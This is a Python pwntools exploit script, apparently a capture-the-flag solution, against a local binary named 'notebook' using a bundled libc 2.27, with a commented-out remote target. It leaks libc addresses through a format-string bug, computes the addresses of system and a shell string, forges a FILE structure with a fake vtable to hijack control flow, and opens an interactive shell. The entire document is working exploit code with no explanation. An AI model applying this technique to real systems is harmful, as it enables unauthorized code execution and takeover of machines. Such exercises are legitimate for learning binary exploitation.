from pwn import *

c = process("./notebook", env={"LD_PRELOAD":"./libc-2.27.so"})
#c = remote("10.10.4.10", 1337)
context.clear(arch='amd64')
def insert(data):
	c.recvuntil(b'> ')
	c.sendline(b'1')
	c.recvuntil(b'Share your deep thoughts with me > ')
	c.sendline(data)

def view():
	c.recvuntil(b'> ')
	c.sendline(b'2')
	return c.recvuntil(b'3) Poiti')



gdb.attach(c)




insert('%3$p')
leak = view()[23:37]
print(leak)
libc = int(leak, 16) - 0xe3d14
print(hex(libc))
insert('%6$p')
print(view())


system = libc + 0x41770
shell = libc + 0x1746fc
_io_str_overflow = libc + 0x3ac2a0 + 0xd8
fake_vtable = _io_str_overflow - 0x10

payload = p64(0x4040c8)
file_struct = FileStructure(null=0x404710)
file_struct._IO_buf_base = 0
file_struct._IO_buf_end = int((shell - 100) // 2)
file_struct._IO_write_ptr = int((shell - 100) // 2)
file_struct._IO_write_base = 0
file_struct.vtable = fake_vtable
payload += bytes(file_struct)
payload += p64(system)
payload += p64(system)
insert(payload)
c.interactive()
